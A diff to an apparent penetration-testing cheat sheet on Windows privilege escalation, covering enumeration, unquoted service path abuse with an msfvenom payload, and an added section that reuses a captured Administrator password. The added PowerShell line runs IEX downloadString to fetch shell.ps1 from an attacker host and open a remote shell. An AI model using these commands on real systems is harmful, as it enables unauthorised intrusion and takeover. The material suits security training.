@@ -491,7 +491,7 @@ Check general host information with ```systeminfo; net users; netstat -ano; ipco
 
 
 
-Auto enumerate with ```winPEAS.exe```
+Auto enumerate with (enum script of choice here:) ```winPEAS.exe```
 
 Check loaded libraries --> potential DLL hijacking
 
@@ -517,11 +517,21 @@ If the path contains a space and is not quoted, the service is vulnerable.
 E.g.:
 ```C:\Program Files\Box\run.exe```
 
+
 It can be exploited by dropping a payload called ```program.exe``` on ```C:\program.exe```
 Payload can be generated with ```msfvenom```, once the service is manually restarted or after rebooting, ```program.exe``` will be executed.
 
-https://github.com/M4ximuss/Powerless
-https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+
+If autologon credential is captured. We can try to log in as admin:
+
+```$newPass = ConvertTo-SecureString '$FOUNDPASSWORD' -AsPlainText -Force```
+
+```$newCred = New-Object System.Management.Automation.PSCredential('Administrator', $newPass)```
+
+Set up a new listener on local Kali, and get a new PowerShell session from remote Windows machine with:
+
+```Start-Process -FilePath “powershell” -argumentlist “IEX(New-Object Net.WebClient).downloadString(‘$LHOST/shell.ps1’)” -Credential $newCred```
+
 https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#privilege-escalation
 
 WinPEAS.exe
